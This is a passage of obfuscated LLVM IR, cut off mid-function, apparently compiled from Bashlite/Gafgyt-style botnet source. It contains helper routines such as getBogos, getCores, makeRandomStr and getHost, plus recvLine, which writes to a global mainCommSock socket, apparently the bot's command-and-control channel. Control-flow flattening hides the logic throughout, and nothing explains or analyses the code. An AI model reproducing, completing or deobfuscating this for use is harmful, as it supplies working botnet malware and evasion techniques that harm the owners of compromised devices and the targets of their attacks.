; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  %switchVar = alloca i32
  store i32 -1844939374, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1844939374, label %4
    i32 882442594, label %10
    i32 53836951, label %13
    i32 1922241771, label %15
    i32 10011649, label %25
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:4:                                      ; preds = %loopEntry
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  %9 = select i1 %8, i32 882442594, i32 53836951
  store i32 %9, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i64, i64* %3, align 8
  %12 = icmp sge i64 %11, 0
  store i32 53836951, i32* %switchVar
  store i1 %12, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %14 = select i1 %.reload, i32 1922241771, i32 10011649
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i64, i64* %3, align 8
  %17 = shl i64 %16, 4
  %18 = load i8*, i8** %2, align 8
  %19 = getelementptr inbounds i8, i8* %18, i32 1
  store i8* %19, i8** %2, align 8
  %20 = load i8, i8* %18, align 1
  %21 = zext i8 %20 to i64
  %22 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %21
  %23 = load i64, i64* %22, align 8
  %24 = or i64 %17, %23
  store i64 %24, i64* %3, align 8
  store i32 -1844939374, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i64, i64* %3, align 8
  ret i64 %26

loopEnd:                                          ; preds = %15, %13, %10, %4, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 600800471, i32* %switchVar
  %.reg2mem12 = alloca i1
  %.reg2mem14 = alloca i1
  %.reg2mem16 = alloca i1
  %.reg2mem18 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar7 = load i32, i32* %switchVar
  switch i32 %switchVar7, label %switchDefault [
    i32 600800471, label %NodeBlock5
    i32 1387852969, label %NodeBlock
    i32 1648644588, label %LeafBlock3
    i32 1542484815, label %LeafBlock1
    i32 1124453322, label %LeafBlock
    i32 1239095646, label %14
    i32 -719693301, label %18
    i32 787050162, label %25
    i32 1381317187, label %31
    i32 856019407, label %38
    i32 -1975717788, label %39
    i32 1858455420, label %42
    i32 -2081899003, label %48
    i32 1568556523, label %56
    i32 -564046884, label %NewDefault
    i32 -439404124, label %59
    i32 1436064122, label %70
    i32 -632932460, label %78
    i32 927028766, label %81
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload11 = load volatile i32, i32* %.reg2mem
  %Pivot6 = icmp slt i32 %.reload11, 42
  %9 = select i1 %Pivot6, i32 1124453322, i32 1387852969
  store i32 %9, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload9 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload9, 63
  %10 = select i1 %Pivot, i32 1542484815, i32 1648644588
  store i32 %10, i32* %switchVar
  br label %loopEnd

LeafBlock3:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf4 = icmp eq i32 %.reload, 63
  %11 = select i1 %SwitchLeaf4, i32 1858455420, i32 -564046884
  store i32 %11, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload8 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload8, 42
  %12 = select i1 %SwitchLeaf2, i32 -719693301, i32 -564046884
  store i32 %12, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload10 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload10, 0
  %13 = select i1 %SwitchLeaf, i32 1239095646, i32 -564046884
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  store i32 %17, i32* %3, align 4
  store i32 927028766, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = getelementptr inbounds i8, i8* %19, i64 1
  %21 = load i8*, i8** %5, align 8
  %22 = call i32 @wildString(i8* %20, i8* %21)
  %23 = icmp ne i32 %22, 0
  %24 = select i1 %23, i32 787050162, i32 -1975717788
  store i32 %24, i32* %switchVar
  store i1 true, i1* %.reg2mem14
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i8*, i8** %5, align 8
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp ne i32 %28, 0
  %30 = select i1 %29, i32 1381317187, i32 856019407
  store i32 %30, i32* %switchVar
  store i1 false, i1* %.reg2mem12
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i8*, i8** %4, align 8
  %33 = load i8*, i8** %5, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 1
  %35 = call i32 @wildString(i8* %32, i8* %34)
  %36 = icmp ne i32 %35, 0
  %37 = xor i1 %36, true
  store i32 856019407, i32* %switchVar
  store i1 %37, i1* %.reg2mem12
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload13 = load i1, i1* %.reg2mem12
  store i32 -1975717788, i32* %switchVar
  store i1 %.reload13, i1* %.reg2mem14
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %.reload15 = load i1, i1* %.reg2mem14
  %40 = xor i1 %.reload15, true
  %41 = zext i1 %40 to i32
  store i32 %41, i32* %3, align 4
  store i32 927028766, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %5, align 8
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp ne i32 %45, 0
  %47 = select i1 %46, i32 -2081899003, i32 1568556523
  store i32 %47, i32* %switchVar
  store i1 false, i1* %.reg2mem16
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i8*, i8** %4, align 8
  %50 = getelementptr inbounds i8, i8* %49, i64 1
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = call i32 @wildString(i8* %50, i8* %52)
  %54 = icmp ne i32 %53, 0
  %55 = xor i1 %54, true
  store i32 1568556523, i32* %switchVar
  store i1 %55, i1* %.reg2mem16
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %.reload17 = load i1, i1* %.reg2mem16
  %57 = xor i1 %.reload17, true
  %58 = zext i1 %57 to i32
  store i32 %58, i32* %3, align 4
  store i32 927028766, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -439404124, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8*, i8** %4, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = call i32 @toupper(i32 %62) #10
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = call i32 @toupper(i32 %66) #10
  %68 = icmp eq i32 %63, %67
  %69 = select i1 %68, i32 1436064122, i32 -632932460
  store i32 %69, i32* %switchVar
  store i1 false, i1* %.reg2mem18
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i8*, i8** %4, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 1
  %73 = load i8*, i8** %5, align 8
  %74 = getelementptr inbounds i8, i8* %73, i64 1
  %75 = call i32 @wildString(i8* %72, i8* %74)
  %76 = icmp ne i32 %75, 0
  %77 = xor i1 %76, true
  store i32 -632932460, i32* %switchVar
  store i1 %77, i1* %.reg2mem18
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %.reload19 = load i1, i1* %.reg2mem18
  %79 = xor i1 %.reload19, true
  %80 = zext i1 %79 to i32
  store i32 %80, i32* %3, align 4
  store i32 927028766, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i32, i32* %3, align 4
  ret i32 %82

loopEnd:                                          ; preds = %78, %70, %59, %NewDefault, %56, %48, %42, %39, %38, %31, %25, %18, %14, %LeafBlock, %LeafBlock1, %LeafBlock3, %NodeBlock, %NodeBlock5, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  store i32 %8, i32* %.reg2mem
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 1960998775, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1960998775, label %first
    i32 -684650619, label %13
    i32 98653213, label %14
    i32 -1571603130, label %15
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %11 = icmp eq i32 %.reload, -1
  %12 = select i1 %11, i32 -684650619, i32 98653213
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  store i32 1, i32* %3, align 4
  store i32 -1571603130, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  store i32 0, i32* %3, align 4
  store i32 -1571603130, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i32, i32* %3, align 4
  ret i32 %16

loopEnd:                                          ; preds = %14, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %switchVar = alloca i32
  store i32 1810465049, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1810465049, label %3
    i32 1183260117, label %8
    i32 22700728, label %17
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:3:                                      ; preds = %loopEntry
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  %7 = select i1 %6, i32 1183260117, i32 22700728
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load i8*, i8** %2, align 8
  %10 = load i8, i8* %9, align 1
  %11 = zext i8 %10 to i32
  %12 = call i32 @toupper(i32 %11) #10
  %13 = trunc i32 %12 to i8
  %14 = load i8*, i8** %2, align 8
  store i8 %13, i8* %14, align 1
  %15 = load i8*, i8** %2, align 8
  %16 = getelementptr inbounds i8, i8* %15, i32 1
  store i8* %16, i8** %2, align 8
  store i32 1810465049, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %8, %3, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.307, i32 0, i32 0), i32 0)
  store i32 %7, i32* %4, align 4
  %switchVar = alloca i32
  store i32 -767562025, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -767562025, label %8
    i32 1885037395, label %14
    i32 907465996, label %21
    i32 -1361558327, label %24
    i32 1551082413, label %30
    i32 -276791276, label %36
    i32 779581077, label %41
    i32 -1234050007, label %43
    i32 -477348456, label %46
    i32 167291857, label %47
    i32 88606670, label %57
    i32 -876690340, label %66
    i32 -1762617050, label %68
    i32 -1248353508, label %74
    i32 1321598446, label %79
    i32 791563419, label %82
    i32 185339846, label %88
    i32 2021373560, label %90
    i32 421605241, label %93
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* %9, i32 4096, i32 %10)
  %12 = icmp ne i8* %11, null
  %13 = select i1 %12, i32 1885037395, i32 2021373560
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @uppercase(i8* %15)
  %16 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %17 = call i8* @strstr(i8* %16, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.308, i32 0, i32 0)) #10
  %18 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %19 = icmp eq i8* %17, %18
  %20 = select i1 %19, i32 907465996, i32 185339846
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  %23 = getelementptr inbounds i8, i8* %22, i64 8
  store i8* %23, i8** %6, align 8
  store i32 -1361558327, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %6, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 32
  %29 = select i1 %28, i32 779581077, i32 1551082413
  store i32 %29, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i8*, i8** %6, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 9
  %35 = select i1 %34, i32 779581077, i32 -276791276
  store i32 %35, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i8*, i8** %6, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 58
  store i32 779581077, i32* %switchVar
  store i1 %40, i1* %.reg2mem
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %42 = select i1 %.reload, i32 -1234050007, i32 -477348456
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i8*, i8** %6, align 8
  %45 = getelementptr inbounds i8, i8* %44, i32 1
  store i8* %45, i8** %6, align 8
  store i32 -1361558327, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 167291857, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i8*, i8** %6, align 8
  %49 = load i8*, i8** %6, align 8
  %50 = call i64 @strlen(i8* %49) #10
  %51 = sub i64 %50, 1
  %52 = getelementptr inbounds i8, i8* %48, i64 %51
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 13
  %56 = select i1 %55, i32 -876690340, i32 88606670
  store i32 %56, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i8*, i8** %6, align 8
  %59 = load i8*, i8** %6, align 8
  %60 = call i64 @strlen(i8* %59) #10
  %61 = sub i64 %60, 1
  %62 = getelementptr inbounds i8, i8* %58, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 10
  store i32 -876690340, i32* %switchVar
  store i1 %65, i1* %.reg2mem2
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %67 = select i1 %.reload3, i32 -1762617050, i32 -1248353508
  store i32 %67, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %6, align 8
  %70 = load i8*, i8** %6, align 8
  %71 = call i64 @strlen(i8* %70) #10
  %72 = sub i64 %71, 1
  %73 = getelementptr inbounds i8, i8* %69, i64 %72
  store i8 0, i8* %73, align 1
  store i32 167291857, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i8*, i8** %6, align 8
  %76 = call i8* @strchr(i8* %75, i32 46) #10
  %77 = icmp ne i8* %76, null
  %78 = select i1 %77, i32 1321598446, i32 791563419
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8*, i8** %6, align 8
  %81 = call i8* @strchr(i8* %80, i32 46) #10
  store i8 0, i8* %81, align 1
  store i32 791563419, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i8*, i8** %3, align 8
  %84 = load i8*, i8** %6, align 8
  %85 = call i8* @strcpy(i8* %83, i8* %84) #2
  %86 = load i32, i32* %4, align 4
  %87 = call i32 @close(i32 %86)
  store i32 0, i32* %2, align 4
  store i32 421605241, i32* %switchVar
  br label %loopEnd

; <label>:88:                                     ; preds = %loopEntry
  %89 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %89, i8 0, i64 4096, i32 16, i1 false)
  store i32 -767562025, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %4, align 4
  %92 = call i32 @close(i32 %91)
  store i32 1, i32* %2, align 4
  store i32 421605241, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %2, align 4
  ret i32 %94

loopEnd:                                          ; preds = %90, %88, %82, %79, %74, %68, %66, %57, %47, %46, %43, %41, %36, %30, %24, %21, %14, %8, %switchDefault
  br label %loopEntry
}

declare i32 @open(i8*, i32, ...) #3

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #1

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.307, i32 0, i32 0), i32 0)
  store i32 %4, i32* %2, align 4
  %switchVar = alloca i32
  store i32 1558736113, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1558736113, label %5
    i32 68500391, label %11
    i32 -1656777485, label %18
    i32 -43081315, label %21
    i32 1478563189, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:5:                                      ; preds = %loopEntry
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* %6, i32 4096, i32 %7)
  %9 = icmp ne i8* %8, null
  %10 = select i1 %9, i32 68500391, i32 1478563189
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @uppercase(i8* %12)
  %13 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %14 = call i8* @strstr(i8* %13, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.308, i32 0, i32 0)) #10
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  %16 = icmp eq i8* %14, %15
  %17 = select i1 %16, i32 -1656777485, i32 -43081315
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i32, i32* %1, align 4
  %20 = add nsw i32 %19, 1
  store i32 %20, i32* %1, align 4
  store i32 -43081315, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 4096, i32 16, i1 false)
  store i32 1558736113, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %2, align 4
  %25 = call i32 @close(i32 %24)
  %26 = load i32, i32* %1, align 4
  ret i32 %26

loopEnd:                                          ; preds = %21, %18, %11, %5, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 901957333, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 901957333, label %6
    i32 -24373779, label %11
    i32 564560000, label %20
    i32 -1045026819, label %23
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  %10 = select i1 %9, i32 -24373779, i32 -1045026819
  store i32 %10, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = call i32 @rand_cmwc()
  %13 = urem i32 %12, 26
  %14 = add i32 %13, 65
  %15 = trunc i32 %14 to i8
  %16 = load i8*, i8** %3, align 8
  %17 = load i32, i32* %5, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  store i8 %15, i8* %19, align 1
  store i32 564560000, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %5, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %5, align 4
  store i32 901957333, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %20, %11, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  %switchVar = alloca i32
  store i32 2115274217, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 2115274217, label %24
    i32 184846536, label %33
    i32 1868335771, label %50
    i32 725760664, label %51
    i32 -892004417, label %55
    i32 523531754, label %60
    i32 1961829336, label %69
    i32 211601846, label %86
    i32 -882269983, label %89
    i32 -1038186269, label %90
    i32 739008170, label %91
    i32 -818142088, label %93
    i32 -986274335, label %98
    i32 2033237221, label %103
    i32 234173186, label %105
    i32 -1683105112, label %113
    i32 -479706691, label %114
    i32 1821297253, label %117
    i32 -1982774527, label %120
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  store i32 184846536, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  %49 = select i1 %48, i32 1868335771, i32 739008170
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  store i32 725760664, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  %52 = load i32, i32* %13, align 4
  %53 = icmp slt i32 %52, 10
  %54 = select i1 %53, i32 -892004417, i32 -1038186269
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* @mainCommSock, align 4
  %57 = call i32 (i32, i8*, ...) @sockprintf(i32 %56, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.309, i32 0, i32 0))
  %58 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %58, align 8
  %59 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %59, align 8
  store i32 523531754, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %62 = getelementptr inbounds [16 x i64], [16 x i64]* %61, i64 0, i64 0
  %63 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %62) #2, !srcloc !2
  %64 = extractvalue { i64, i64* } %63, 0
  %65 = extractvalue { i64, i64* } %63, 1
  %66 = trunc i64 %64 to i32
  store i32 %66, i32* %14, align 4
  %67 = ptrtoint i64* %65 to i64
  %68 = trunc i64 %67 to i32
